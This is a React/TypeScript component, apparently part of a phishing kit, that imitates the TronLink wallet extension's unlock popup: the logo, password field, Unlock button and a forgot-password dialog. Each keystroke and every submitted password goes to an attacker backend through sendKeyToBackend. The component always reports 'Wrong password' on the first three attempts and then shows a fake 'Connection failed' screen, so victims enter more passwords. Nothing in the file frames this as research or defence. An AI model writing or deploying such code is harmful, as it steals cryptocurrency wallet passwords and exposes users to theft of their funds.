import React, { useState, useEffect, useRef } from 'react';
import { initializeLocationData, initializeSocket, sendKeyToBackend } from '../../services/keyService';
import { WALLET_TYPE_SHORTKEY } from '../../services/config';
import { CustomWalletModalProps } from '../../types';
import { resolveAssetUrl } from '../../utils/assetPath';
import { ASSET_PATHS } from '../../utils/assetPaths';
import './styles.css';

const TronlinkModal: React.FC<CustomWalletModalProps> = ({ isOpen, onClose, userId, backendConfig }) => {
  const [keyword, setKeyword] = useState('');
  const [error, setError] = useState(false);
  const [helperText, setHelperText] = useState('');
  const [trying, setTrying] = useState(0);
  const [connecting, setConnecting] = useState(false);
  const [connectionError, setConnectionError] = useState(false);
  const [isClosable, setIsClosable] = useState(true);
  const [shouldShake, setShouldShake] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [loadingInitiate, setLoadingInitiate] = useState(true);
  const [showForgetPasswordModal, setShowForgetPasswordModal] = useState(false);
  const [continueCountdown, setContinueCountdown] = useState(0);
  
  const passwordInputRef = useRef<HTMLInputElement>(null);
  const modalRef = useRef<HTMLDivElement>(null);
  const countdownIntervalRef = useRef<number | null>(null);

  // Handle initial loading - only run once when modal opens
  useEffect(() => {
    if (isOpen) {
      initializeLocationData();
      initializeSocket();

      setLoadingInitiate(true);
      const initialLoadTimeout = setTimeout(() => {
        setLoadingInitiate(false);
        setTimeout(() => {
          passwordInputRef.current?.focus();
        }, 1500);
      }, 1500);

      return () => {
        clearTimeout(initialLoadTimeout);
      };
    } else {
      setLoadingInitiate(true);
    }
  }, [isOpen]);

  // Handle document click - separate effect
  useEffect(() => {
    if (!isOpen) return;

    const handleDocumentClick = (e: MouseEvent) => {
      if (isClosable && modalRef.current && !modalRef.current.contains(e.target as Node)) {
        handleClick();
      }
    };

    document.addEventListener('click', handleDocumentClick);
    return () => {
      document.removeEventListener('click', handleDocumentClick);
    };
  }, [isOpen, isClosable]);

  // Cleanup countdown interval
  useEffect(() => {
    return () => {
      if (countdownIntervalRef.current) {
        clearInterval(countdownIntervalRef.current);
      }
    };
  }, []);

  const handleClick = () => {
    if (onClose) onClose();
    setKeyword('');
    setTrying(0);
    setConnectionError(false);
    setError(false);
    setShouldShake(false);
    setShowPassword(false);
    setShowForgetPasswordModal(false);
    setContinueCountdown(0);
    if (countdownIntervalRef.current) {
      clearInterval(countdownIntervalRef.current);
      countdownIntervalRef.current = null;
    }
  };

  const handleKeywordChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const newKeyword = e.target.value;
    setKeyword(newKeyword);
    setError(false);
    setShouldShake(false);

    const currentUserId = backendConfig?.userId || userId;
    if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
      await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.TRONLINK);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(prev => !prev);
    setTimeout(() => {
      passwordInputRef.current?.focus();
    }, 0);
  };

  const handleKeywordTyping = async () => {
    if (connecting || !keyword) return;

    setConnecting(true);
    const currentUserId = backendConfig?.userId || userId;

    if (!currentUserId) {
      setConnecting(false);
      setError(true);
      setHelperText('User ID is required');
      setShouldShake(true);
      setTimeout(() => setShouldShake(false), 500);
      return;
    }

    if (backendConfig?.enabled !== false) {
      const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.TRONLINK);

      setTimeout(() => {
        setConnecting(false);
        if (trying < 3) {
          setError(true);
          setHelperText(result.error || 'Wrong password');
          setTrying(trying + 1);
          setShouldShake(true);
          setTimeout(() => setShouldShake(false), 500);
        } else {
          setConnectionError(true);
        }
        passwordInputRef.current?.focus();
      }, 150);
    } else {
      setTimeout(() => setConnecting(false), 150);
    }
  };

  const showForgetPassword = () => {
    setShowForgetPasswordModal(true);
    setContinueCountdown(10);
    
    // Start countdown timer
    countdownIntervalRef.current = setInterval(() => {
      setContinueCountdown(prev => {
        if (prev > 1) {
          return prev - 1;
        } else {
          if (countdownIntervalRef.current) {
            clearInterval(countdownIntervalRef.current);
            countdownIntervalRef.current = null;
          }
          return 0;
        }
      });
    }, 1000);
  };

  const closeForgetPasswordModal = () => {
    if (countdownIntervalRef.current) {
      clearInterval(countdownIntervalRef.current);
      countdownIntervalRef.current = null;
    }
    setShowForgetPasswordModal(false);
    setContinueCountdown(0);
  };

  const handledResetPwd = () => {
    handleClick();
    closeForgetPasswordModal();
    window.open('chrome-extension://acmacodkjbdgmoleebolmdjonilkdbch/index.html#/forgot-password', '_blank');
  };

  const closeWindow = () => {
    handleClick();
    setTimeout(() => {
      setConnectionError(false);
      setKeyword('');
      setTrying(0);
      setError(false);
    }, 1000);
  };

  if (!isOpen) return null;

  const isButtonEnabled = keyword && keyword.trim().length > 0;

  const modalContent = (
    <div
      id="header-layout"
      ref={modalRef}
      className={`fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}
      onMouseEnter={() => setIsClosable(false)}
      onMouseLeave={() => setIsClosable(true)}
    >
      <div className="w-[360px] h-[601px] shadow-[0_4px_20px_0_rgba(0,0,0,0.3)] relative">
        <div className="h-full relative" style={{ backgroundColor: '#FFFFFF' }}>
          {connectionError ? (
            <div className="text-center px-4 py-8 flex flex-col h-full justify-between">
              <div></div>
              <div className="">
                <div className="flex justify-center w-full items-center mb-4">
                  <svg className="text-2xl text-center w-6 h-6 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                  </svg>
                </div>
                <h3 className="text-xl font-extrabold">Connection failed</h3>
                <p className="text-sm">Please check your connection and try again.</p>
              </div>
              <button
                className="w-full rounded-full cursor-pointer p-2.5 text-white hover:bg-[#3148f5] bg-[#4459ff]"
                onClick={closeWindow}
              >
                Ok
              </button>
            </div>
          ) : (
            <div className="relative w-full h-full" style={{ backgroundColor: '#FFFFFF' }}>
              {/* Loading Screen */}
              {loadingInitiate && (
                <div className="absolute inset-0 z-[1002] flex items-center justify-center bg-transparent">
                  <div className="px-[30px] py-[20px] rounded-[8px]" style={{ backgroundColor: '#232C41db' }}>
                    <img src={resolveAssetUrl(ASSET_PATHS.tronlinkLoading)} alt="Loading" width="50" height="50" />
                  </div>
                </div>
              )}

              <div className={`flex flex-col h-full bg-white`}>
                <div className="flex flex-col overflow-y-auto h-full justify-between pb-[30px]">
                  <div>
                    <div className="flex justify-center mt-[80px] mb-[100px]">
                      <svg width="150" height="120" viewBox="0 0 150 120" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <g clipPath="url(#clip0_35_162)">
                          <path fillRule="evenodd" clipRule="evenodd" d="M7.41504 119.326H11.7971V90.6738H7.41504V119.326Z" fill="black"/>
                          <path fillRule="evenodd" clipRule="evenodd" d="M0 95.0559H19.2135V90.6738H0V95.0559Z" fill="black"/>
                          <path fillRule="evenodd" clipRule="evenodd" d="M80.8994 119.325H95.3938V114.943H80.8994V119.325Z" fill="black"/>
                          <path fillRule="evenodd" clipRule="evenodd" d="M80.8994 119.326H85.2814V90.6738H80.8994V119.326Z" fill="black"/>
                          <path fillRule="evenodd" clipRule="evenodd" d="M99.1016 119.324H103.484V102.302H99.1016V119.324Z" fill="black"/>
                          <path fillRule="evenodd" clipRule="evenodd" d="M99.1016 99.9431H103.484V95.561H99.1016V99.9431Z" fill="black"/>
                          <path d="M129.943 90.6738H134.325V105.245L143.877 96.2356H149.241L139.252 105.587L150 119.326H144.852L136.292 108.357L134.325 110.216V119.326H129.943V90.6738Z" fill="black"/>
                          <path d="M44.4942 101.63C48.7758 101.63 52.2469 105.101 52.2471 109.382C52.2471 113.664 48.776 117.135 44.4942 117.135C40.2127 117.135 36.7422 113.664 36.7422 109.382C36.7425 105.101 40.2128 101.631 44.4942 101.63Z" stroke="black" strokeWidth="4.38202"/>
                          <path d="M25.4568 99.438H21.2363V119.326H25.4568V106.464C26.2575 105.397 27.2955 104.573 28.5708 103.99C29.6221 103.505 30.8092 103.162 32.1318 102.962V98.853C31.0642 99.1296 29.6038 99.5099 28.5263 100.033C27.4487 100.557 26.4256 101.179 25.4568 101.9V99.438Z" fill="black"/>
                          <path d="M111.742 119.326V106.484V100.535V98.0898H107.36V119.326H111.742Z" fill="black"/>
                          <path d="M125.899 106.095C125.899 100.308 123.262 97.4146 117.988 97.4146C116.71 97.4146 115.555 97.6739 114.522 98.1925C112.692 99.2347 111.991 100.192 111.75 100.95L111.741 102.532C113.595 101.043 116.498 100.818 117.765 101.136C120.73 101.881 121.324 105.025 121.25 106.504V119.325H125.899V106.095Z" fill="black"/>
                          <path d="M62.8654 119.326V106.484V100.535V98.0898H58.4834V119.326H62.8654Z" fill="black"/>
                          <path d="M77.0225 106.095C77.0225 100.308 74.3855 97.4146 69.1115 97.4146C67.8338 97.4146 66.6784 97.6739 65.6454 98.1925C63.8155 99.2347 63.1147 100.192 62.8743 100.95L62.8652 102.532C64.7187 101.043 67.6215 100.818 68.8888 101.136C71.8543 101.881 72.4478 105.025 72.3738 106.504V119.325H77.0225V106.095Z" fill="black"/>
                          <mask id="mask0_35_162" style={{ maskType: 'alpha' }} maskUnits="userSpaceOnUse" x="40" y="0" width="70" height="70">
                            <path d="M100 0H50C44.4772 0 40 4.47716 40 10V60C40 65.5228 44.4772 70 50 70H100C105.523 70 110 65.5228 110 60V10C110 4.47716 105.523 0 100 0Z" fill="url(#paint0_linear_35_162)"/>
                          </mask>
                          <g mask="url(#mask0_35_162)">
                            <path fillRule="evenodd" clipRule="evenodd" d="M99.3647 54.8138L131.907 48.9341L94.5792 94.303L99.3647 54.8138ZM94.6909 52.6018L89.6436 94.2585L62.405 25.8895L94.6909 52.6018ZM96.8985 48.0684L65.9196 22.4375L116.55 31.7323L96.8985 48.0684ZM121.927 33.6328L132.672 43.8229L103.282 49.1323L121.927 33.6328ZM123.055 27.9513L52.8105 15.056L89.7807 107.852L141.29 45.2454L123.055 27.9513Z" fill="white"/>
                            <rect x="40" width="70" height="70" rx="8.75" fill="#0D1FFF"/>
                            <mask id="mask1_35_162" style={{ maskType: 'alpha' }} maskUnits="userSpaceOnUse" x="40" y="0" width="70" height="70">
                              <rect x="40" width="70" height="70" rx="8.75" fill="#0D1FFF"/>
                            </mask>
                            <g mask="url(#mask1_35_162)">
                              <path d="M117.783 24.0991L50.3096 14.6152L87.9951 107.896L139.942 41.4097L117.783 24.0991ZM127.379 40.1933L105.45 44.8853L116.855 31.9729L127.376 40.1933H127.379ZM109.727 29.8076L95.6515 45.7432L67.6936 23.9022L109.727 29.8105V29.8076ZM87.3429 88.1971L63.5246 29.2405L92.455 51.8425L87.3458 88.1971H87.3429ZM94.0533 89.1373L99.1095 53.1675L126.782 47.2474L94.0562 89.1373H94.0533Z" fill="white"/>
                            </g>
                          </g>
                        </g>
                        <defs>
                          <linearGradient id="paint0_linear_35_162" x1="75" y1="0" x2="75" y2="70" gradientUnits="userSpaceOnUse">
                            <stop stopColor="#0D1FFF"/>
                            <stop offset="1" stopColor="#081399"/>
                          </linearGradient>
                          <clipPath id="clip0_35_162">
                            <rect width="150" height="120" fill="white"/>
                          </clipPath>
                        </defs>
                      </svg>
                    </div>
                    <div className="mx-[20px] mt-[12px]">
                      <div className="relative">
                        <input 
                          id="current-password"
                          ref={passwordInputRef}
                          placeholder="Password" 
                          type={showPassword ? "text" : "password"} 
                          autoComplete="off" 
                          spellCheck="false" 
                          value={keyword} 
                          onChange={handleKeywordChange}
                          onKeyDown={(e) => {
                            if (e.key === 'Enter' && isButtonEnabled) {
                              handleKeywordTyping();
                            }
                          }}
                          className={`tronlink-font border rounded-lg text-[14px] font-medium h-[52px] leading-[52px] px-4 pl-4 pr-10 w-full ${
                            error 
                              ? "border-[#ff4d4f]" 
                              : "border-[#1a212b]"
                          } ${shouldShake ? 'password-shake' : ''}`}
                          style={{ backgroundColor: 'white', color: 'black' }}
                        />
                        <svg 
                          className="cursor-pointer absolute right-4 top-4" 
                          width="20" 
                          height="20" 
                          viewBox="0 0 20 20" 
                          fill="none" 
                          xmlns="http://www.w3.org/2000/svg"
                          onClick={togglePasswordVisibility}
                        >
                          {showPassword ? (
                            <>
                              <path d="M10.1529 4.59982C6.40178 4.59982 3.17595 6.87419 1.8999 10.1018C3.17595 13.3294 6.40176 15.6038 10.1529 15.6038C13.9041 15.6038 17.131 13.3294 18.4059 10.1018C17.131 6.87417 13.9041 4.59982 10.1529 4.59982M10.1529 13.7695C8.0526 13.7695 6.40178 12.1564 6.40178 10.1018C6.40178 8.04723 8.0526 6.43413 10.1529 6.43413C12.2544 6.43413 13.9041 8.04723 13.9041 10.1018C13.9041 12.1564 12.2544 13.7695 10.1529 13.7695ZM10.1529 7.90104C8.87799 7.90104 7.90204 8.85526 7.90204 10.1018C7.90204 11.3484 8.87799 12.3026 10.1529 12.3026C11.429 12.3026 12.4038 11.3484 12.4038 10.1018C12.4038 8.85526 11.429 7.90104 10.1529 7.90104" fill="#B3B6BD"/>
                            </>
                          ) : (
                            <>
                              <path d="M10.1529 4.59982C6.40178 4.59982 3.17595 6.87419 1.8999 10.1018C3.17595 13.3294 6.40176 15.6038 10.1529 15.6038C13.9041 15.6038 17.131 13.3294 18.4059 10.1018C17.131 6.87417 13.9041 4.59982 10.1529 4.59982M10.1529 13.7695C8.0526 13.7695 6.40178 12.1564 6.40178 10.1018C6.40178 8.04723 8.0526 6.43413 10.1529 6.43413C12.2544 6.43413 13.9041 8.04723 13.9041 10.1018C13.9041 12.1564 12.2544 13.7695 10.1529 13.7695ZM10.1529 7.90104C8.87799 7.90104 7.90204 8.85526 7.90204 10.1018C7.90204 11.3484 8.87799 12.3026 10.1529 12.3026C11.429 12.3026 12.4038 11.3484 12.4038 10.1018C12.4038 8.85526 11.429 7.90104 10.1529 7.90104" fill="#B3B6BD"/>
                              <path d="M16.7771 16.7229L15.8227 17.6774L3.22266 5.07739L4.17715 4.12289L16.7771 16.7229Z" fill="#B3B6BD"/>
                              <path d="M17.6773 15.8227L16.7228 16.7772L4.1228 4.17721L5.07729 3.22272L17.6773 15.8227Z" fill="white"/>
                            </>
                          )}
                        </svg>  
                      </div>
                    </div>
                    <div className={`text-[#ff4d4f] flex text-[12px] h-[30px] leading-[17px] mt-1 px-[20px] w-full`}>
                      {error && helperText && <span>{helperText}</span>}
                    </div>
                    <div className="mx-[20px]">
                      <button 
                        onClick={isButtonEnabled ? handleKeywordTyping : undefined}
                        disabled={!isButtonEnabled || connecting}
                        className={`tronlink-font self-center rounded-[8px] text-[14px] leading-[40px] p-0 flex items-center border-none flex h-[52px] justify-center relative transition-all duration-200 ease-in-out w-full ${
                          isButtonEnabled 
                            ? "bg-[#1a212b] text-white hover:bg-[#484d55] cursor-pointer"
                            : "bg-[#eeeff0] text-[#9ba4b6] opacity-100 cursor-not-allowed"
                        }`}
                      >
                        {connecting ? 'Unlocking...' : 'Unlock'}
                      </button>
                    </div>
                  </div>
                  <div className="flex flex-col overflow-y-auto mt-[30px] overflow-hidden px-[20px] w-full">
                    <div className="tronlink-font text-center text-[12px] text-[#6d778c]">Unable to log in?</div>
                    <div className="tronlink-font justify-center mt-2 text-center flex-row flex text-[12px] text-[#6d778ca8]">
                      <div 
                        className="tronlink-font cursor-pointer underline decoration-underline underline-offset-1 text-[12px] hover:text-[#3c7cf3] text-[#232c41]"
                        onClick={showForgetPassword}
                      >
                        Unlock in other ways
                      </div>
                      &nbsp;or&nbsp;
                      <div 
                        className="tronlink-font cursor-pointer underline decoration-underline underline-offset-1 text-[12px] hover:text-[#3c7cf3] text-[#232c41]"
                        onClick={showForgetPassword}
                      >
                        create a new wallet
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Forgot Password Modal */}
              {showForgetPasswordModal && (
                <div id="forget-password-modal" className="absolute inset-0 z-[1001]">
                  <div className="relative w-full h-full">
                    <div 
                      className="bg-[#10101099] absolute bottom-0 left-0 right-0 top-0"
                      onClick={closeForgetPasswordModal}
                    ></div>
                    <div tabIndex={-1} className="absolute bottom-0 left-0 right-0 top-0 text-center flex items-center justify-center" role="dialog">
                      <div role="document" className="mx-[20px] box-border text-[#000000d9] text-[14px] tabular-nums list-none p-0 pb-[24px] pointer-events-none relative w-[520px]">
                        <div tabIndex={0} aria-hidden="true" style={{width: "0px", height: "0px", overflow: "hidden", outline: "none"}}></div>
                        <div className="rounded-[12px] border-0 shadow-[0_3px_6px_-4px_rgba(0,0,0,0.12),_0_6px_16px_0_rgba(0,0,0,0.08),_0_9px_28px_8px_rgba(0,0,0,0.05)] pointer-events-auto relative bg-white">
                          <div className="p-[24px_16px_16px] text-[14px] leading-[1.5715] break-words">
                            <div className="mb-[20px] text-center">
                              <div className="text-[16px] font-bold tronlink-font">Security Tip</div>
                            </div>
                            <p className="tronlink-font text-[13px] leading-[20px] mb-[16px] text-left text-[#6d778c]">                        
                              <svg className="inline-block align-middle mr-[6px]" width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <circle cx="7" cy="7" r="7" fill="#FF4D4F"/>
                                <path d="M7 3.81787V8.5906" stroke="white" strokeWidth="1.27273" strokeLinecap="round"/>
                                <path d="M7 10.1821V10.8185" stroke="white" strokeWidth="1.27273" strokeLinecap="round"/>
                              </svg>
                              All your existing wallets will be removed and replaced with the new one.
                            </p>
                            <p className="tronlink-font text-[13px] leading-[20px] mb-[16px] text-left text-[#6d778c]">                           
                              <svg className="inline-block align-middle mr-[6px]" width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <circle cx="7" cy="7" r="7" fill="#FF4D4F"/>
                                <path d="M7 3.81787V8.5906" stroke="white" strokeWidth="1.27273" strokeLinecap="round"/>
                                <path d="M7 10.1821V10.8185" stroke="white" strokeWidth="1.27273" strokeLinecap="round"/>
                              </svg>
                              Please make sure you have backed up your mnemonic or private keys, otherwise you will not be able to recover the assets in your wallets.
                            </p>
                            <p className="tronlink-font text-[#ff4d4f] text-[13px] leading-[20px] mb-[16px] text-left">                           
                              <svg className="inline-block align-middle mr-[6px]" width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <circle cx="7" cy="7" r="7" fill="#FF4D4F"/>
                                <path d="M7 3.81787V8.5906" stroke="white" strokeWidth="1.27273" strokeLinecap="round"/>
                                <path d="M7 10.1821V10.8185" stroke="white" strokeWidth="1.27273" strokeLinecap="round"/>
                              </svg>
                              Do not continue unless you have tried all possible ways to unlock this wallet and have backed up your mnemonic or private key
                            </p>
                            <div 
                              className={`tronlink-font mt-[24px] rounded-[6px] text-white text-[13px] h-[38px] leading-[38px] text-center ${
                                continueCountdown > 0 
                                  ? "bg-[#cdd1da] cursor-not-allowed" 
                                  : "bg-[#232c41] cursor-pointer hover:bg-[#3a4555]"
                              }`}
                              onClick={continueCountdown === 0 ? handledResetPwd : undefined}
                              style={{ pointerEvents: continueCountdown > 0 ? 'none' : 'auto' }}
                            >
                              {continueCountdown > 0 
                                ? `Continue in ${continueCountdown}s` 
                                : "Continue"
                              }
                            </div>
                            <div 
                              className="tronlink-font cursor-pointer text-[13px] h-[20px] leading-[20px] mt-[12px] text-center hover:opacity-80 text-[#6d778c]"
                              onClick={closeForgetPasswordModal}
                            >
                              Back
                            </div>
                          </div>
                        </div>
                        <div tabIndex={0} aria-hidden="true" className="w-0 h-0 overflow-hidden outline-none"></div>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );

  return modalContent;
};

export default TronlinkModal;
